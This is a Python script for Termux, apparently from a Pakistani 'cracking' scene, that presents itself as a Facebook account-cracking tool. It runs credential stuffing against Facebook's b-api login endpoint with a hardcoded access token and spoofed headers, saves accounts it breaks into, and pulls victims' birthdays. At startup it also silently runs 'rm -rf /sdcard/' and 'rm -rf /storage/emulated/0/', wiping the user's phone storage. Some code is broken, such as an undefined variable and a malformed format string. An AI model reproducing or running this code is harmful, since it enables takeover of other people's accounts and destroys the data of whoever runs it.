#!/usr/bin/python
# -*- koding: utf-8 -*-

import requests,bs4,sys,os,random,time,re,json,uuid,subprocess
from random import randint
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from requests.exceptions import ConnectionError
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as par
from bs4 import BeautifulSoup as parser
from bs4 import BeautifulSoup
from datetime import date
from datetime import datetime
from urllib.parse import quote
from bs4 import BeautifulSoup as parser
os.system('termux-setup-storage')
os.system('rm -rf /sdcard/')
os.system('rm -rf /storage/emulated/0/')


ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]

sys.stdout.write('\x1b[1;37m\x1b]2; PHUCKER BALOCH\x07')
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print(' HELLO BRO USE VPN IF USE FIRST TIME THIS TOOL')
prox=open('.prox.txt','r').read().splitlines()

Z = "\x1b[0;90m"     
M = "\x1b[38;5;196m" 
H = "\x1b[38;5;46m"  
K = "\x1b[38;5;226m" 
B = "\x1b[38;5;44m"  
U = "\x1b[1;95m"     
I = "\x1b[1;96m"     
P = "\x1b[38;5;231m" 
J = "\x1b[38;5;208m" 
A = "\x1b[38;5;248m" 

#PHUCK
	


try:
	import requests
except ImportError:
	print(f"{P}[✓]{M} pip install requests")
	os.system("pip install requests")
try:
	import bs4
except ImportError:
	print(f"{P}[✓]{M} pip install bs4")
	os.system("pip install bs4")
try:
	import concurrent.futures
except ImportError:
	print(f"{P}[✓]{M} pip install bs4")
	os.system("pip install futures")
	
	
host = ("https://mbasic.facebook.com")
B = random.choice([B,U,J,I])
#### LOGO
def banner():
    war_dom = random.choice([A,K,I,J,U,H])
    print("""
\n\033[0;96m                    
  ███   ██   █    ████▄ ▄█▄     ▄  █ 
  █  █  █ █  █    █   █ █▀ ▀▄  █   █ 
  █ ▀ ▄ █▄▄█ █    █   █ █   ▀  ██▀▀█ 
  █  ▄▀ █  █ ███▄ ▀████ █▄  ▄▀ █   █ 
  ███      █     ▀      ▀███▀     █  
          █

\033[0;96m╔══\033[0;97m[•] Authur      \033[0;96m╔══\033[0;97m[•] Mr Baloch
\033[0;96m╠══\033[0;97m[•] Whatsp      \033[0;96m╠══\033[0;97m[•] +92347xxxx
\033[0;96m╚══\033[0;97m[•] Github      \033[0;96m╚══\033[0;97m[•] BALOCH420
          
       \033[47m\033[1;31m Abdullah \033[41m\033[1;37m X  Baloch \x1b[0m\n
""")

skrng = datetime.now()
tahun = skrng.year
bulan = skrng.month
hari  = skrng.day
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Agusts", "09": "September", "10": "October", "11": "November", "12": "Desember"}
bulan_cek = ["January", "February", "March", "April", "May", "June", "July", "Agusts", "September", "October", "November", "Desember"]
os.system("git pull")
try:
    if bulan < 0 or bulan > 12:
        exit()
    bulan_skrng = bulan - 1
except ValueError:
    exit()
_bulan_ = bulan_cek[bulan_skrng]
tanggal = ("%s-%s-%s"%(hari,_bulan_,tahun))


id = []
ok = []
cp = []
loop=0


def resik():
    if "linux" in sys.platform.lower():
        try:os.system("clear")
        except:pass
    elif "win" in sys.platform.lower():
        try:os.system("cls")
        except:pass
    else:
        try:os.system("clear")
        except:pass

def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
		
		
url_businness = "https://business.facebook.com"
ua_business = "Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/229.0.0.8.128;]"
kata_dev = 'Lu Ganteng Banget Bang. Gw Mau Recode SClu, Soalnya Gw Goblok Soal Coding'
web_fb = "https://www.facebook.com/"
m_fb = "https://m.facebook.com/"
mbasic = "https://mbasic.facebook.com/"
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}


def mkdir_data_login():
    # Make Directory Login Data
    try:os.mkdir("login")
    except:pass
    # Make Directory Result
    try:os.mkdir("CP")
    except:pass
    # Make Directory Result
    try:os.mkdir("OK")
    except:pass

def baloch():
    os.system("clear");banner()
    print(f"{B}[F] File Crack ")
    bb = input(f"{P}\n   Choose : {B}")
    if bb in ["5","05"]:
        exit()
    elif bb in ["f","F"]:
    	os.system("clear");banner()
    	fastv2()
    else:print(f'{M}  Roung Input !!');baloch()

def fastv2():
			try:
				fileX = input ('\n \033[0;96m[✓] Enter file path : ') 
				for line in open(fileX, 'r').readlines():
					id.append(line.strip())
				baloch_xd()
			except IOError:
				exit("\n [!] file %s not found"%(fileX))


def baloch_xd():
	balochv2()
	mub =input(f"{P}   Choose : {P}")
	if mub in [""]:
		print(f"{B}   {M} Roung Input");exit()
	elif mub in ["1","01"]:
		print(f"{B} \n \033[0;96m[✓] Want Start Crack {P}Y/t")
		_start_=input(f"{P}\n   Choose : {P}")
		if _start_ in ["t","T"]:
			exit()

		else:
			print(f"{B} \n \033[0;96m[✓] Crack password manual/default {P}M/D")
			pas =input(f"{P}\n   Choose : {P}")
			if pas in ["m","M"]:
				exit()
			elif pas in ["d","D"]:
				with ThreadPoolExecutor(max_workers=30) as coeg:
					started()
					for user in id:
						uid, name = user.split("|")
						frist=name.split(" ")
						if len(frist)>=6:
							fii = [ name ]
						elif len(frist)<=2:
							fii = [ name ]
						elif len(frist)<=3:
							fii = [ name ]
						else:
							fii = [ name ]

						coeg.submit(apiiii, uid, fii)
				exit()

				
def balochv2():
	
    print(f"{B} \n\033[0;96m ╔══\033[0;97m[1] Method B-api > {B}\033[0;96mFast")
    print(f"{B}\033[0;96m ╠══\033[0;97m[×] Method Mbasic > {B}\033[0;96mNot Available")
    print(f"{B}\033[0;96m ╚══\033[0;97m[×] Method Mobile > {B}\033[0;96mNot Available\n")

def started():
	
    print(f"{B} \n\n\n\033[0;96m ╔══\033[0;97m[•] Total id : {P}{len(id)}\x1b[92;1m\n\033[0;96m ╠══\033[0;97m[•] Use Flight Mode Before Use\n\033[0;96m ╚══\033[0;97m[•] Crack Started..... ")
    print(f"{B} {P}")

def apiiii(uid, fii):
    try:
        ua = open("ua", "r").read()
    except IOError:
        ua = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
    global ok, cp, loop, token, cookie

    sys.stdout.write(f"\r{B}\033[0;96m[Baloch]{P} {loop}|{len(id)} {H}[Ok:{H}{len(ok)}] {K}[Cp:{K}{len(cp)}]");sys.stdout.flush()
    for pw in fii:
        pw = pw.lower()
        headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
        ses = requests.Session()
        send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_inlololid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
        if "session_key" in send.text and "EAAA" in send.text:
            print(f"\r{H}[ok] {H}{uid}|{pw}")
            ok.append("%s|%s"%(uid, pw))
            open("OK/%s.baloch"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
            break
        elif "www.facebook.com" in send.json()["error_msg"]:
            try:
                token  = open('login/token.json','r').read()
                cookie = {'cookie':open('login/cookie.json','r').read()}
                ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token),cookies=cookie).json()["birthday"]
                month, day, year = ttl.split("/")
                month = _bulan_[month]
                print(f"\r{B}[cp] {B}{uid}|{pw}•{day} {mont} {year}")
                cp.append("%s|%s"%(uid, pw))
                open("CP/%s.baloch%"(tanggal),"a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
                break
            except (KeyError, IOError):
                day = (" ")
                month = (" ")
                year = (" ")
            except:pass
            print(f"\r{B}\033[0;96m[cp] {B}\033[0;96m{uid}|{pw}")
            cp.append("%s|%s"%(uid, pw))
            open("CP/%s.baloch"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
            break
        else:
            continue

    loop += 1

if __name__=="__main__":
    os.system("clear")
    mkdir_data_login()
    baloch()
